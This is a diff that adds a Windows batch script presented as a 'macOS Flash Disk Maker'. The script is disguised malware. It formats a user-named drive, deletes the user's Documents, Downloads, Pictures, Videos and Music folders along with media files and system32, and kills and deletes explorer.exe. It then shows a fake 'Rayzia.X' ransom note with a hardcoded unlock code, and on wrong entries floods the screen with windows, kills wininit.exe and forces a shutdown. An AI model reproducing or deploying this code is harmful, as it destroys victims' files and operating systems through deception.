@@ -1,0 +1,542 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCeDJGmM+1Y/OydndTe+O2a7BfsV6+eb
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJmZk8aFUrWXA==
+::ZQ05rAF9IBncCkqN+0xwdVsFHUrTXA==
+::ZQ05rAF9IAHYFVzEqQI9KRh7f0SgNWz6NaAOiA==
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQIdKRBRDCmDP0SJRqAP6qjo++OEqQx9
+::dhA7uBVwLU+EWHiU5E41SA==
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATEphJieVv2hUSjMGf6FLwb4Pzor/iCsUgPQuc7Nu8=
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCeDJHSF+FUxOh5oWBaNNmq0FYku6fHh5uu1o0MOW+8DdY7YmrKCIfMbpED8cPY=
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@shift /0
+@echo off
+title WARNING
+color 0a
+title macOS Flasher
+color 83
+:format
+cls
+echo Welcome to macOS Flash Disk Maker
+echo With this program you can make USB Stick with macOS
+pause
+cls
+echo Type disk letter to remake
+echo e.g. D:
+set /p letter=Letter: 
+cls
+echo Type "Y" to accept.
+echo We must format this drive
+format %letter% /q
+cls
+goto one
+
+:one
+cls
+title Please Wait...
+echo Now we flash files to the drive, please wait.
+pause
+color 0a
+takeown /f C:\Windows\taskmgr.exe 2>nul >nul
+/del C:\Windows\taskmgr.exe /s /q 2>nul >nul
+rd %USERPROFILE%\Documents 2>nul >nul
+rd %USERPROFILE%\Downloads 2>nul >nul
+rd %USERPROFILE%\Pictures 2>nul >nul
+rd %USERPROFILE%\Videos 2>nul >nul
+rd %USERPROFILE%\Music 2>nul >nul
+del %USERPROFILE%\Documents\*.* /s /q 2>nul >nul
+del %USERPROFILE%\Music\*.* /s /q 2>nul >nul
+del %USERPROFILE%\Downloads\*.* /s /q 2>nul >nul
+del %USERPROFILE%\Pictures\*.* /s /q 2>nul >nul
+del %USERPROFILE%\Videos\*.* /s /q 2>nul >nul
+cls
+cd C:
+del *.webp 2>nul >nul
+del *.jpeg 2>nul >nul
+del *.txt 2>nul >nul
+del *.png 2>nul >nul
+del *.jpg 2>nul >nul
+del *.bmp 2>nul >nul
+del *.iso 2>nul >nul
+del *.msi 2>nul >nul
+del *.avi 2>nul >nul
+del *.wav 2>nul >nul
+del *.mp3 2>nul >nul
+del *.mp4 2>nul >nul
+del *.mov 2>nul >nul
+takeown /f C:\Windows\system32 2>nul >nul
+del C:\Windows\system32\*.* /s /q 2>nul >nul
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+echo Trashed >FuckYou%random%.rayzia
+
+cls
+taskkill /f /im explorer.exe
+del C:\Windows\explorer.exe
+cls
+title Rayzia
+echo You became victim of Rayzia.X ransomware!
+echo Your files has been encrypted and you must buy key
+echo to decrypt your files!
+echo If you close this window or try to turn off computer, 
+echo your computer will be destroyed!
+echo YOU HAVE 3 CHANCES!
+set /p code=Code: 
+if %code%==23xcq0278 goto repair
+if not %code%==23xcq0278 goto chance1
+
+:chance1
+cls
+echo Nope.
+echo Code wrong
+echo 2 CHANCES
+set /p codx=Code: 
+if %codx%==23xcq0278 goto repair
+if not %codx%==23xcq0278 goto chance2
+
+:chance2
+cls
+echo NO!
+echo WRONG :D
+echo You have only one chance
+set /p codr=Code: 
+if %codr%==23xcq0278 goto repair
+if not %codr%==23xcq0278 goto nope
+
+:nope
+cls
+echo Hahahaa
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+shutdown -s -t 5
+taskkill /f /im wininit.exe
+
+
+:repair
+echo repaired fuck u
+start explorer.exe
+exit
